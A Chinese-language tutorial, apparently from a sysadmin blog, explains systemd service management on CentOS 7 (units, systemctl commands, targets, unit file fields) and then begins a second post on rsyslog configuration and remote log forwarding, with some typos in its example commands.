init方案的优点：\n1.原理简单，易于理解； 2.依靠shell脚本控制，编写服务脚本门槛比较低。 缺点是：\n1.服务顺序启动，启动过程比较慢。 2.不能做到根据需要来启动服务，比如通常希望插入U盘的时候，再启动USB控制的服务，这样可以更好的节省系统资源。 1.2 UpStart的改进 为了解决系统服务的即插即用，UpStart应运而生，在CentOS6系统中，SysV init和UpStart是并存的，UpStart主要解决了服务的即插即用。服务顺序启动慢的问题，UpStart的解决办法是把相关的服务分组，组内的服务是顺序启动，组之间是并行启动。\n1.3 systemd的诞生 SysV init服务启动慢，在以前并不是一个问题，尤其是Linux系统以前主要是在服务器系统上，常年也难得重启一次。有的服务器光硬件检测都需要5分钟以上，相对来说系统启动已经很快了。\n但是随着移动互联网的到来，SysV init服务启动慢的问题显得越来越突出，许多移动设备都是基于Linux内核，比如安卓。移动设备启动比较频繁，每次启动都要等待服务顺序启动，显然难以接受，systemd就是为了解决这个问题诞生的。\nsystemd的设计思路是：\n尽可能的快速启动服务。 尽可能的减少系统资源占用。 1.4 为什么systemd能做到启动很快 systemd使用并行的方法启动服务，不像SysV init是顺序执行的，所以大大节省了系统启动时间。\n使用并行启动，最大的难点是要解决服务之间的依赖性，systemd的解决办法是使用类似缓冲池的办法。比如对TCP有依赖的服务，在启动的时候会检查依赖服务的TCP端口，systemd会把对TCP端口的请求先缓存起来，当依赖的服务器启动之后，在将请求传递给服务，使两个服务通讯。同样的进程间通讯的D-BUS也是这样的原理，目录挂载则是先让服务以为目录被挂载了，到真正访问目录的时候，才去真正操作。\nsystemd的特性 systemd解决了那些问题？\n按需启动服务，减少系统资源消耗； 尽可能并行启动进程，减少系统启动等待时间； 提供一个一致的配置环境，不光是服务配置； 提供服务状态快照，可以恢复特定点的服务状态。 CentOS 7的systemd特性 3.1 套接字服务保持激活功能 在系统启动的时候，systemd为所有支持套接字激活功能的服务创建监听端口，当服务启动后，就将套接字传给这些服务。这种方式不仅可以允许服务在启动的时候平行启动，也可以保证在服务重启期间，试图连接服务的请求，不会丢失。对服务端口的请求被保留，并且存放到队列中。\n3.2 进程间通讯保持激活功能 当有客户端应用第一次通过D-Bus方式请求进程间通讯时，systemd会立即启动对应的服务。systemd依据D-Bus的配置文件使用进程间通讯保持激活功能。\n3.3 设备保持激活功能 当特定的硬件插入时，systemd启动对应的硬件服务支持。systemd依据硬件服务单元配置文件保持硬件随时被激活。\n3.4 文件路径保持激活功能 当特定的文件或者路径状态发生改变的时候，systemd会激活对应的服务。systemd依据路径服务单元配置文件保证服务被激活。\n3.5 系统状态快照 systemd可以临时保存当前所有的单元配置文件，或者从前一个快照中恢复单元配置文件。为了保存当前系统服务状态，systemd可以动态的生成单元文件快照。\n3.6 挂载和自动挂载点管理 systemd监控和管理挂载和自动挂载点，并根据挂载点的单元配置文件进行挂载。\n3.7 闪电并行启动 因为使用套接字保持激活功能，systemd可以并行的启动所以套接字监听服务，大大减少系统启动时间。\n3.8 单元逻辑模拟检查 当激活或者关闭一个单元，systemd会计算依赖行，产生一个临时的模拟检查，并且校验一直性。如果不一致，systemd会尝试自动修正，并且移除报错的不重要的任务。\n3.9 和SysV init向后兼容 systemd完全支持SysV init Linux标准的基础核心规范脚本，这样的脚本易于升级到systemd服务单元。\n核心概念:unit 4.1 什么是单元 在RHEL7之前，服务管理是分布式的被SysV init或UpStart通过 /etc/rc.d/init.d 下的脚本管理。这些脚本是经典的Bash脚本，允许管理员控制服务的状态。在RHEL7中，这些脚本被服务单元文件替换。\n在systemd中，服务、挂载等资源统一被称为单元，所以systemd中有许多单元类型，服务单元文件的扩展名是.service，同脚本的功能相似。例如有查看、启动、停止、重启、启用或者禁止服务的参数。\n配置文件进行标识和配置：文件中主要包含了系统服务、监听socket、保存的系统快照及其他与init相关的信息。\nsystemd单元文件放置位置：\n/usr/lib/systemd/system/systemd\t# 默认单元文件安装目录\r/run/systemd/system\t# 单元运行时创建，这个目录优先于安装目录\r/etc/systemd/system\t# 系统管理员创建和管理的单元目录，优先级最高。\r4.2 Unit类型 类型 详解- Service unit 文件扩展名为service，用于定义系统服务。 Target unit 文件扩展名为.target，用于模拟实现“运行级别” Device unit 文件扩展名为.device，用于定义内核识别的设备。 Mount unit 文件扩展名为.mount，定义文件系统挂载点 Socket unit 文件扩展名为.socket，用于表示进程间通信用的socket文件 Snapshot unit 文件扩展名为.sanpshot，管理系统快照 Swap unit 文件扩展名为.swap，用于表示swap设备 Automount unit 文件扩展名为.automount，文件系统的自动挂载点 Path unit 文件扩展名为.path，用于定义文件系统中的一个文件或目录 .service 与服务对应的后缀名为service的unit、文件，无需执行权限，仅仅为systemd的配置文件。当systemd探测到有进程访问时，按需激活这个服务的机制，任何依赖与这个服务的其他服务想启动的话，\n服务的并行启动：\n.device 在某个硬件设备被激活或变得可用时，从而激活服务\n.path：某个文件路径变得可用或里面有文件时（文件发生变动）激活某个服务\n系统快照：\nsystemd能将所有unit当前状态保存到临时文件中（临时保存到一个持久设备上）。启动时，可从保存的快照开始继续向后运行。 必要时能自动载入。\n向后兼容：\nsysV init脚本。（能够兼容 start、stop restart status至少这4个服务脚本）以前启动服务的脚本放到centos7里直接可以用。\nCentOS 7的systemd向后兼容 systemd被设计成尽可能向后兼容SysV init和Upstart，下面是一些特别要注意的和之前主要版本的RHEL不再兼容的部分。\n5.1 systemd对运行级别支持有限 为了保存兼容，systemd提供有限target单元，“模拟”一些运行级别，也可以被早期的分布式的运行级别命令支持。不是所有的target都可以被映射到运行级别，在这种情况下，使用runlevel命令有可能会返回一个为N的不知道的运行级别，所以推荐尽量避免在RHEL7中使用runlevel命令。\n5.2 systemd不支持像init脚本那样的个性化命令。 除了一些标准命令参数例如：start、stop、status，SysV init脚本可以根据需要支持想要的任何参数，通过参数提供附加的功能，因为SysV init的服务器脚本实际上就是shell脚本，命令参数实际上就是shell子函数。\n举个例子，RHEL6的iptables服务脚本可以执行panic命令行参数，这个参数可以让系统立即进入紧急模式，丢弃所有的进入和发出的数据包。但是类似这样的命令行参数在systemd中是不支持的，systemd只支持在配置文件中指定命令行参数。\n5.3 systemd不支持和没有从systemd启动的服务通讯。 当systemd启动服务的时候，他保存进程的主ID以便于追踪，systemctl工具使用进程PID查询和管理服务。相反的，如果用户从命令行启动特定的服务，systemctl命令是没有办法判断这个服务的状态是启动还是运行的。\n5.4 systemd可以只停止运行的服务 在RHEL6及之前的版本，当关闭系统的程序启动之后，RHEL6的系统会执行/etc/rc0.d/下所有服务脚本的关闭操作，不管服务是处于运行或者根本没有运行的状态。而systemd可以做到只关闭在运行的服务，这样可以大大节省关机的时间。\n5.5 不能从标准输出设备读到系统服务信息。 systemd启动服务的时候，将标准输出信息定向到/dev/null，以免打扰用户。\n5.6 systemd不继承任何上下文环境。 systemd不继承任何上下文环境，如用户或者会话的HOME或者PATH的环境变量。每个服务得到的是干净的上下文环境。\n5.7 SysV init脚本依赖性 当systemd启动SysV init脚本，systemd在运行的时候，从LinuxStandardBase(LSB)Linux标准库头文件读取服务的依赖信息并继承。\n5.8 超时机制 为了防止系统被卡住，所有的服务有5分钟的超时机制。\nsystemd服务管理 使用systemcl命令可以控制服务，service命令和chkconfig命令依然可以使用，但是主要是出于兼容的原因，应该尽量避免使用service命令和chkconfig命令。\n使用systemctl命令的时候，服务名字的扩展名可以写全，例如：\nsystemctl stop httpd.service\r也可以忽略，例如：\nsystemctl stop httpd\r6.1 常用命令 6.2 服务管理 说明 命令 启动服务 service name start ==\tsystemctl start name.service 停止服务 service name stop\t== systemctl stop name.service 重启服务 service name restart\t== systemctl restart name.service 查看服务状态 service name status == systemctl status name.service 条件式重启 service name condrestart == systemctl try-restart name.service 重载或重启服务 systemctl reload-or-restart name.service 重载或条件式重启 systemctl reload-or-try-restart name.service 禁止设定为开机自启动 systemctl mask name.service 取消设定为开机自启动 systemctl unmask name.service 查看服务当前激活与否的状态 systemctl is-active name.service 允许服务开机启动 systemctl enable name.service 禁止服务开机启动 systemclt disable name.service 级别切换 systemctl list-units \u0026ndash;type target 获取默认运行级别 systemctl get-default 修改默认级别 systemctl set-default name.service 切换至紧急救援模式 systemctl rescue 切换至emergency模式 systemctl emergency 关机 systemctl halt systemctl poweroff 重启 systemctl reboot 挂起 systemctl suspend 快照 systemctl hibernate 快照并挂起 systemctl hybrid-sleep 6.3 查看服务详细信息 查看所有已激活的服务。默认只列出处于激活状态的服务，如果希望看到所有的服务，使用\u0026ndash;all或-a参数：\nsystemctl list-units --type service\r查看所有的服务\nsystemctl list-units --type service --all\r检查服务开机启动状态\nsystemctl status name.service\rsystemctl is-enabled name.service\r列出所有服务并且检查是否开机启动\nsystemctl list-unit-files --type service\r选项重新加载所以单元文件并重新创建依赖书，在需要立即应用单元文件改变的时候使用。另外，也可以使用init q的命令达到同样的目的。还有，如果修改的是一个正在运行服务的单元文件，服务需要被重启下：\nsystemct lrestart name.service\rsystemctl daemon-reload\r查看服务依赖关系\nsystemctl list-dependencies\rsystemd target 在RHEL7之前的版本，使用运行级别代表特定的操作模式。运行级别被定义为七个级别，用数字0到6表示，每个级别可以启动特定的一些服务。RHEL7使用target替换运行基本。\nsystemd target使用target单元文件描述，target单位文件扩展名是.target，target单元文件的唯一目标是将其他systemd单元文件通过一连串的依赖关系组织在一起。举个例子，graphical.target单元，用于启动一个图形会话，systemd会启动像GNOME显示管理(gdm.service)、帐号服务（axxounts-daemon）这样的服务，并且会激活multi-user.target单元。相似的multi-user.target单元，会启动必不可少NetworkManager.service、dbus.service服务，并激活basic.target单元。\nRHEL7预定义了一些target和之前的运行级别或多或少有些不同。为了兼容，systemd也提供一些target映射为SysV init的运行级别，具体的对应信息如下：\n代码 命令 说明 0 runlevel0.target,poweroff.targe 关闭系统。 1 runlevel1.target,rescue.target 进入救援模式。 2 runlevel2.target,multi-user.target 进入非图形界面的多用户方式。 3 runlevel3.target,multi-user.target 进入非图形界面的多用户方式。 4 runlevel4.target,multi-user.target 进入非图形界面的多用户方式。 5 runlevel5.target,graphical.target 进入图形界面的多用户方式。 6 runlevel6.target,reboot.target 重启系统。 注：对于systemd来说 234没有区别\n7.1 target管理 使用如下命令查看目前可用的target：\nsystemctl list-units --type target\r改变当前的运行基本使用如下命令：\nsystemctl isolate name.target\rsystemctl isolate rescue.target\r$ runlevel 1 3\r7.2 修改默认的运行级别 使用systemctl get-default命令得到默认的运行级别：\n$ systemctl get-default multi-user.target\r使用systemctl set-default name.target修改默认的运行级别：\nsystemctl set-default graphical.target # 可以看到。默认级别就是操作如下两步骤\rrm '/etc/systemd/system/default.target'\rln-s'/usr/lib/systemd/system/graphical.target''/etc/systemd/system/default.target'\r使用 Target 的时候，systemctl list-dependencies命令和systemctl isolate命令也很有用。 查看 multi-user.target 包含的所有服务\nsystemctl list-dependencies multi-user.target\r一般来说，常用的 Target 有两个：一个是multi-user.target，表示多用户命令行状态；另一个是graphical.target，表示图形用户状态，它依赖于multi-user.target。官方文档有一张非常清晰的 Target 依赖关系图。\n7.3 Target 的配置文件 Target 也有自己的配置文件。\n[Unit]\rDescription=Multi-User System\rDocumentation=man:systemd.special(7)\rRequires=basic.target\t# Requires字段：要求basic.target一起运行。\r# 冲突字段。如果rescue.service或rescue.target正在运行，multi-user.target就不能运行，反之亦然。\rConflicts=rescue.service rescue.target\r# 表示multi-user.target在basic.target 、 rescue.service、 rescue.target之后启动，如果它们有启动的话。\rAfter=basic.target rescue.service rescue.target\r# 允许使用systemctl isolate命令切换到multi-user.target。\rAllowIsolate=yes\r注意，Target 配置文件里面没有启动命令。\n7.4 救援模式和紧急模式 使用进入救援模式，如果连救援模式都进入不了，可以进入紧急模式：\nsystemctl rescue # 救援模式（进入救援模式，如果连救援模式都进入不了，可以进入紧急模式）\rsysttmctl emergency # 紧急模式\r紧急模式进入最小的系统环境，以便于修复系统。紧急模式根目录以只读方式挂载，不激活网络，只启动很少的服务，进入紧急模式需要root密码。\n关闭、暂停、休眠系统 RHEL7中，使用systemctl替换一些列的电源管理命令，原有的命令依旧可以使用，但是建议尽量不用使用。systemctl和这些命令的对应关系为：\n说明 SysV/Upstart system 停止系统（关机） halt systemctl hatl 关闭系统，关闭系统电源 poweroff systemctl poweroff 重启系统 reboot systemctl reboot 暂停系统 pm-suspend systemctl suspend 休眠系统 pm-hibernate systemct lhibernate 暂停并休眠系统 pm-suspend-hybrid systemctl hybrid-sleep 通过systemd管理远程系统 不光是可以管理本地系统，systemd还可以控制远程系统，管理远程系统主要是通过SSH协议，只有确认可以连接远程系统的SSH，在systemctl命令后面添加-H或者\u0026ndash;host参数，加上远程系统的ip或者主机名就可以。\n创建和修改systemd单元文件 10.1 单元文件概述 一个服务怎么启动，完全由它的配置文件决定。下面就来看，配置文件有些什么内容。\n配置文件主要放在/usr/lib/systemd/system目录，也可能在/etc/systemd/system目录。找到配置文件以后，使用文本编辑器打开即可。\n下面以sshd.service文件为例，它的作用是启动一个 SSH 服务器，供其他用户以 SSH 方式登录。\n[Unit]\rDescription=OpenSSH server daemon\rDocumentation=man:sshd(8) man:sshd_config(5)\rAfter=network.target sshd-keygen.service\rWants=sshd-keygen.service\r[Service]\rEnvironmentFile=/etc/sysconfig/sshd\rExecStart=/usr/sbin/sshd -D $OPTIONS\rExecReload=/bin/kill -HUP $MAINPID\rType=simple\rKillMode=process\rRestart=on-failure\rRestartSec=42s\r[Install]\rWantedBy=multi-user.target\r$ systemctl status rsyncd\rrsyncd.service - fast remote file copy program daemon\rLoaded: loaded (/usr/lib/systemd/system/rsyncd.service; disabled) # loaded 服务已经被加载，显示单元文件绝对路径，标志单元文件可用。\r# disabled表示开机不允许启动Status服务的附件信息。\rActive: active (running) since 四 2017-01-26 21:59:41 CST; 5min ago\r# active表示当前状态 从什么时间被激活\rMain PID: 1360 (rsync) # main pid 与进程名字一致的PID，主进程PID。进程可能有多个进程可能有一组\rCGroup: /system.slice/rsyncd.service\r└─1360 /usr/bin/rsync --daemon --no-detach\r# cgroup表示资源组，启动命令是/usr/bin/rsync --daemon --no-detach\r1月 26 21:59:41 lnmp systemd[1]: Starting fast remote file copy program daemon...\r1月 26 21:59:41 lnmp systemd[1]: Started fast remote file copy program daemon.\r$ systemctl status rsyncd\rrsyncd.service - fast remote file copy program daemon\rLoaded: loaded (/usr/lib/systemd/system/rsyncd.service; disabled)\rActive: inactive (dead)/\r上面的输出结果含义如下:\u0026quot;\u0026quot;\nLoaded行：配置文件的位置，是否设为开机启动 Active行：表示正在运行 Main PID行：主进程ID Status行：由应用本身（这里是 httpd ）提供的软件当前状态 Cgroup块：应用的所有子进程 日志块：应用的日志 10.2 理解单元文件结构 10.3 单元文件概述 可以看到，配置文件分成几个区块，每个区块包含若干条键值对。 典型的单元文件包含三节：\n[Unit]：包含不依赖单元类型的一般选项，这些选型提供单元描述，知道单元行为，配置单元和其他单元的依赖性。\n[unittype]：如果单元有特定的类型指令，在unittype节这些指令被组织在一起。举个例子，服务单元文件包含[Service]节，里面有经常使用的服务配置。\n[Install]：包含systemctl enable或者disable的命令安装信息。\n10.3.1 [Unit]节选项 字段 说明 Description 字段给出当前服务的简单描述 Documentation 给出文档位置。 启动顺序 注意:After和Before字段只涉及启动顺序，不涉及依赖关系 After 表示sshd.service应该在network.target sshd-keygen.service之后启动。 Before 定义sshd.service应该在哪些服务之前启动。 举例来说，某 Web 应用需要 postgresql 数据库储存数据。在配置文件中，它只定义要在 postgresql 之后启动，而没有定义依赖 postgresql 。上线后，由于某种原因，postgresql 需要重新启动，在停止服务期间，该 Web 应用就会无法建立数据库连接。 设置依赖关系，需要使用Wants字段和Requires字段。 Wants 表示sshd.service与sshd-keygen.service之间存在 \u0026ldquo;弱依赖\u0026rdquo; 关系，即如果\u0026quot;sshd-keygen.service\u0026quot;启动失败或停止运行，不影响sshd.service继续执行。 Requires 表示 \u0026ldquo;强依赖\u0026rdquo; 关系，即如果该服务启动失败或异常退出，那么sshd.service也必须退出。 注意，Wants字段与Requires字段只涉及依赖关系，与启动顺序无关，默认情况下是同时启动的。 10.3.2 [Service] 区块：启动行为 Service区块定义如何启动当前服务。\n启动命令\n许多软件都有自己的环境参数文件，该文件可以用EnvironmentFile字段读取。\nEnvironmentFile字段：指定当前服务的环境参数文件。该文件内部的key=value键值对，可以用$key的形式，在当前配置文件中获取。\r上面的例子中，sshd 的环境参数文件是/etc/sysconfig/sshd。\n配置文件里面最重要的字段是ExecStart。\nExecStart：定义启动进程时执行的命令。\r上面的例子中，启动sshd，执行的命令是/usr/sbin/sshd -D $OPTIONS，其中的变量$OPTIONS就来自EnvironmentFile字段指定的环境参数文件。\n与之作用相似的，还有如下这些字段：\n选项 说明 ExecStart 指定启动单元的命令或者脚本，ExecStartPre和ExecStartPost节指定在ExecStart之前或者之后用户自定义执行的脚本。Type=oneshot允许指定多个希望顺序执行的用户自定义命令。 ExecStop 指定单元停止时执行的命令或者脚本。 ExecReload 指定单元重新加载是执行的命令或者脚本。 ExecStartPre 启动服务之前执行的命令 ExecStartPost 启动服务之后执行的命令 ExecStopPost 停止服务之后执行的命令 Restart 这个选项如果被允许，服务重启的时候进程会退出，会通过systemctl命令执行清除并重启的操作。 RemainAfterExit 如果设置这个选择为真，服务会被认为是在激活状态，即使所以的进程已经退出，默认的值为假，这个选项只有在Type=oneshot时需要被配置。 请看下面的例子。\n[Service]\rExecStart=/bin/echo execstart1\rExecStart=\rExecStart=/bin/echo execstart2\rExecStartPost=/bin/echo 1\rExecStartPost=/bin/echo 2\r上面这个配置文件，第二行ExecStart设为空值，等于取消了第一行的设置，运行结果如下。\n$ systemctl start test $ systemctl status test\rtest.service - test daemon\rLoaded: loaded (/usr/lib/systemd/system/test.service; disabled)\rActive: inactive (dead)\r1月 30 07:11:16 lnmp systemd[1]: Starting test daemon...\r1月 30 07:11:16 lnmp systemd[1]: Started test daemon.\r1月 30 07:11:16 lnmp echo[1822]: test1_start\r1月 30 07:11:16 lnmp echo[1824]: test1_stop\r所有的启动设置之前，都可以加上一个连词号（-），表示\u0026ldquo;抑制错误\u0026rdquo;，即发生错误的时候，不影响其他命令的执行。比如，EnvironmentFile=-/etc/sysconfig/sshd（注意等号后面的那个连词号），就表示即使/etc/sysconfig/sshd 文件不存在，也不会抛出错误。\n启动类型\nType字段定义启动类型。它可以设置的值如下。\n选项值 说明 simple 默认值，ExecStart字段启动的进程为主进程 forking 进程作为服务主进程的一个子进程启动，父进程在完全启动之后退出。 oneshot 类似于simple，但只执行一次，进程在启动单元之后随之退出。 dbus 类似于simple，但随着单元启动后只有主进程得到D-BUS名字。 notify 类似于simple，启动结束后会发出通知信号，然后 Systemd 再启动其他服务 idle 类似于simple，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合 下面是一个oneshot的例子，笔记本电脑启动时，要把触摸板关掉，配置文件可以这样写。\n[Unit]\rDescription=Switch-off Touchpad\r[Service]\rType=oneshot\rExecStart=/usr/bin/touchpad-off\r[Install]\rWantedBy=multi-user.target\r上面的配置文件，启动类型设为oneshot，就表明这个服务只要运行一次就够了，不需要长期运行。\n如果关闭以后，将来某个时候还想打开，配置文件修改如下。\n[Unit]\rDescription=Switch-off Touchpad\r[Service]\rType=oneshot\rExecStart=/usr/bin/touchpad-off start\rExecStop=/usr/bin/touchpad-off stop\rRemainAfterExit=yes\r[Install]\rWantedBy=multi-user.target\r上面配置文件中，RemainAfterExit字段设为yes，表示进程退出以后，服务仍然保持执行。这样的话，一旦使用systemctl stop命令停止服务，ExecStop指定的命令就会执行，从而重新开启触摸板。\n重启行为\nService区块有一些字段，定义了重启行为。\nKillMode字段：定义 Systemd 如何停止 sshd 服务。\r上面这个例子中，将KillMode设为process，表示只停止主进程，不停止任何sshd 子进程，即子进程打开的 SSH session 仍然保持连接。这个设置不太常见，但对sshd很重要，否则你停止服务的时候，会连自己打开的SSH session一起杀掉。\nKillMode字段可以设置的值如下：\n选项值 说明 control-group （默认值）\t当前控制组里面的所有子进程，都会被杀掉 process 只杀主进程 mixed 主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号 none 没有进程会被杀掉，只是执行服务的 stop 命令。 Restart字段。\nRestart字段：定义了 sshd 退出后，Systemd 的重启方式。\n上面的例子中，Restart设为on-failure，表示任何意外的失败，就将重启sshd。如果 sshd 正常停止（比如执行systemctl stop命令），它就不会重启。\nRestart字段可以设置的值如下。\n选项值 说明 no 默认值；退出后不会重启 on-success 只有正常退出时（退出状态码为0），才会重启 on-failure 非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启 on-abnormal 只有被信号终止和超时，才会重启 on-abort 只有在收到没有捕捉到的信号终止时，才会重启 on-watchdog 超时退出，才会重启 always 不管是什么退出原因，总是重启 对于守护进程，推荐设为on-failure。对于那些允许发生错误退出的服务，可以设为on-abnormal。\nRestartSec字段。\nRestartSec字段：表示 Systemd 重启服务之前，需要等待的秒数。上面的例子设为等待42秒。\n[Install] 区块\r\u0026nbsp;说明：Install区块，定义如何安装这个配置文件，即怎样做到开机启动。\rWantedBy字段：表示该服务所在的 Target。\rTarget的含义是服务组，表示一组服务。WantedBy=multi-user.target指的是，sshd 所在的 Target 是multi-user.target。\n这个设置非常重要，因为执行systemctl enable sshd.service命令时，sshd.service的一个符号链接，就会放在/etc/systemd/system目录下面的multi-user.target.wants子目录之中。\nSystemd 有默认的启动 Target。\n$ systemctl get-default\rmulti-user.target\r上面的结果表示，默认的启动 Target 是multi-user.target。在这个组里的所有服务，都将开机启动。这就是为什么systemctl enable命令能设置开机启动的原因。\n修改配置文件后重启\n修改配置文件以后，需要重新加载配置文件，然后重新启动相关服务。\n# 重新加载配置文件\rsystemctl daemon-reload\r10.4 一个postfix服务的例子： 单元文件位于/usr/lib/systemd/system/postifix.service，内容如下：\n[Unit] Description=PostfixMailTransportAgent After=syslog.targetnetwork.target Conflicts=sendmail.serviceexim.service [Service] Type=forking PIDFile=/var/spool/postfix/pid/master.pid EnvironmentFile=-/etc/sysconfig/network\rExecStartPre=-/usr/libexec/postfix/aliasesdb\rExecStartPre=-/usr/libexec/postfix/chroot-update\rExecStart=/usr/sbin/postfixstart\rExecReload=/usr/sbin/postfixreload\rExecStop=/usr/sbin/postfixstop\r[Install] WantedBy=multi-user.target\r10.5 创建自定义的单元文件 以下几种场景需要自定义单元文件：\n希望自己创建守护进程； 为现有的服务创建第二个实例； 引入SysV init脚本。 另外一方面，有时候需要修改已有的单元文件。下面介绍创建单元文件的步骤：\n准备自定义服务的执行文件。 可执行文件可以是脚本，也可以是软件提供者的的程序，如果需要，为自定义服务的主进程准备一个PID文件，一保证PID保持不变。另外还可能需要的配置环境变量的脚本，确保所以脚本都有可执行属性并且不需要交互。\n2.在/etc/systemd/system/目录创建单元文件，并且保证只能被root用户编辑\ntouch /etc/systemd/system/mariadb.service\rchmod 644 /etc/systemd/system/mariadb.service\r注：文件不需要执行权限。\n打开name.service文件，添加服务配置，各种变量如何配置视所添加的服务类型而定，下面是一个依赖网络服务的配置例子： [Unit] Description=mariadb multi demo 3306\rAfter=network.target\r[Service] ExecStart=/data/3306/mysql start\rExecReload=/data/3306/mysql restart\rExecStop=/data/3306/mysql stop\rType=forking\rPIDFile=/data/3306/mysqld.pid\r[Install] WantedBy=multi-user.target\r4.通知systemd有个新服务添加：\nsystemctl daemon-reload systemctl start name.service\r10.5 创建第二个sshd服务的例子\r1.拷贝sshd_config文件\ncp /etc/ssh/sshd{,-second}_config\r# {,second} 等于 和second ，类似与 {a,c}的用法\r2.编辑sshd-second_config文件，添加22220的端口，和PID文件：\nPort 22220 PidFile /var/run/sshd-second.pid\r如果还需要修改其他参数，请阅读帮助。\n3.拷贝单元文件：\ncp /usr/lib/systemd/system/sshd{,-second}.service\r4.编辑单元文件sshd-second.service\n[Unit] Description=OpenSSH server second instance daemon After=syslog.target network.targe tauditd.service sshd.service [Service] EnvironmentFile=/etc/sysconfig/sshd\rExecStart=/usr/sbin/sshd -D -f /etc/ssh/sshd-second_config $OPTIONS ExecReload=/bin/kill -HUP $MAINPID KillMode=process Restart=on-failure RestartSec=42s [Install] WantedBy=multi-user.target\r5.如果使用SELinux，添加tcp端口，负责第二sshd服务的端口就会被拒绝绑定：\nsemanage port -a -tssh_port_t -p tcp22220\r6.设置开机启动并测试：\nsystemctl enable sshd-second.service ssh -p 22220 user@server\r10.6 修改已经存在的单元文件 systemd unit配置文件默认保存在/usr/lib/systemd/system/目录，不建议直接修改这个目录下的文件，自定义的文件在/etc/systemd/system/目录下，如果有扩展的需求，可以使用以下方案：\n创建一个目录/etc/systemd/system/unit.d/，这个是最推荐的一种方式，可以参考初始的单元文件，通过附件配置文件来扩展默认的配置，对默认单元文件的升级会被自动升级和应用。\n从/usr/lib/systemd/system/拷贝一份原始配置文件到/etc/systemd/system/，然后修改。复制的版本会覆盖原始配置，这种方式不能增加附件的配置包，用于不需要附加功能的场景。\n如果需要恢复到默认的配置文件，只需要删除/etc/systemd/system/下的配置文件就可以了，不需要重启机器。\nReference [CentOS7/RHEL7 systemd详解](CentOS7/RHEL7 systemd详解)\nsystemd.index 中文手册\nSystemd 入门教程：实战篇\n","permalink":"https://www.oomkill.com/2016/04/systemd/","summary":"","title":"Linux服务管理 - systemd"},{"content":"rsyslog介绍 syslog守护进程，内部有两个进程，syslogd主要负责用户空间的用户进程记录日志；klog负责内核所发生的各种时间记录日志。两者合并后形成syslog。\nrsyslog是syslog下一代升级产品，依然有syslogd klogd提供服务。\nrsyslog可以开通远程机制监听在某个套接字上，其他任何主机所产生的日志信息由本机的rsyslog收集起来，收集完后不负责记录，而是建立一个tcp或udp连接发送给专门的日志服务器，由专门的日志服务器负责记录。默认情况下是明文的。\nrsyslog特性 多线程。 支持UDP,TCP协议，基于ssl tls加密完成远程日志传输。支持RELP协议 实现将日志存储到MySQL PGSQL等关系型数据库中。 强大的过滤器，可实现过滤日志信息中任何部分，支持自定义输出格式。 日志格式 事件产生的事件 主机 进程pid 事件\nJun 6 23:36:58 Lamp-02 NET[1838]: /etc/sysconfig/network-scripts/ifup-post: updated /etc/resolv.conf\rJun 6 23:46:15 Lamp-02 yum[1963]: Updated: mysql-libs-5.1.73-8.el6_8.x86_64\rJun 6 23:46:16 Lamp-02 yum[1963]: Installed: mysql-5.1.73-8.el6_8.x86_64\r有些日志记录二进制日志 /var/log/wtmp /var/log/btmp\nlast：/var/log/wtmp 当前系统中成功登陆的日志\nlastb：/var/log/btmp 当前系统中失败的登陆尝试\nlastlog：显示当前系统每一个用户最近一次登陆时间\n日志等级 日志级别：事件的关键性程度\nlev\t|说明\nlev 说明 none 不记录 debug 调试信息 info 正常信息，仅是一些基本信息说明 notice 比info还需要注意的一些信息内容 warning,warn 警告信息，可能有些问题，但是还不至于影响到某个服务运作的信息 err,error 一些重大的错误信息 crit 临界状态，比error还要严重的错误信息，橙色警报 alert 红色警报，已经很有问题的等级，比crit还要严重 emerg,panic 疼痛等级，意指系统已经要宕机的状态！很严重的错误信息 设施类型 facility：把某一类具有相同特性的由各个应用程序所产生的日志数据流归类到用一个数据收集管道中，这个收集管道称之为facility。\n类型 说明 auth(authpriv) 与认证有关的机制，例如login ssh su等需要账号密码 cron 例行性工作调度cron/at等生成信息日志的地方 daemon 与各个daemon有关的信息。 kern 内核产生信息地方 lpr 打印相关信息 mail 邮件收发有关的信息 news 新闻组服务器有关信息 syslog 自身产生日志 user 用户 security 与安全相关信息 local0-local7 用户自定义8个设置 通配机制 通配符 说明 . 代表【比后面还要高的等级（含该等级）都被记录下来】 例如：mail.info代表只要是mail信息，而且该信息等级高于info（含info）时，就会被记录下来。 .= 代表所需要的等级就是后面接的等级而已，其他的不要。例如：main.=info代表的只要是mail信息，而且该信息等于info级别，就会被记录下来。 .! 代表不等于（取反），亦是除了该等级外的其他等级都记录。 * 所有；例如：*.info代表所有设施的info级别 none 不记录 日志的输出位置 位置 说明 文件 /var/log/messages 打印机或其他设备 /dev/lp0这个打印机装置 使用者名称 显示给用户，*代表目前在线所有的人 远程主机 @10.0.0.2 远程日志服务器，@代表udp协议，@@代表tcp协议 管道 |command $ rpm -ql rsyslog\r/etc/logrotate.d/syslog\r/etc/pki/rsyslog\r/etc/rsyslog.conf \u0026lt;==配置文件\r/etc/rsyslog.d\r/etc/sysconfig/rsyslog\r/usr/bin/rsyslog-recover-qi.pl\r/usr/lib/systemd/system/rsyslog.service \u0026lt;==单元文件\r/usr/lib64/rsyslog\r/usr/lib64/rsyslog/imdiag.so \u0026lt;==收集日志接受日志流输入时的输入过滤工具\r/usr/lib64/rsyslog/omjournal.so \u0026lt;==\r/var/lib/rsyslog\rrsyslog配置文件详解 rsyslog配置文件分为3个模块， 每段的配置必须严格写在#### xxx ####位置内\n$ grep '##' /etc/rsyslog.conf\r#### MODULES #### #\u0026lt;==加载的模块\r#### GLOBAL DIRECTIVES #### #\u0026lt;==定义日志格式默认模板\r#### RULES #### #\u0026lt;==转发规则\r# ### begin forwarding rule ###\r# ### end of the forwarding rule ###\r常用参数 $ModLoad imklog #\u0026lt;==加载模块\rmail.* -/var/log/maillog #\u0026lt;==将mail所有类型的日志异步写入maillog文件中\rrsyslog案例 设置ssh日志为其他设施 修改ssh配置文件 #SyslogFacility AUTHPRIV\rSyslogFacility local1\r修改rsyslog配置文件 将ssh日志写入到ssh.log中\nlocal1.* -/var/log/ssh.log\r使用ssh登陆查看日志生成结果\n$ cat /var/log/ssh.log\rJun 7 00:15:17 Lamp-02 sshd[2966]: Accepted password for root from 192.168.2.1 port 57670 ssh2\r将日志记录到远程服务器 在客户端配置\n*.info;mail.none;authpriv.none;cron.none;local0.none; @192.168.2.82\r服务端开启配置\n$ModLoad imudp\r$UDPServerRun 514\r查看服务端的日志记录情况\n$ cat /var/log/messages\rJun 2 05:47:59 lnmp yum[128171]: 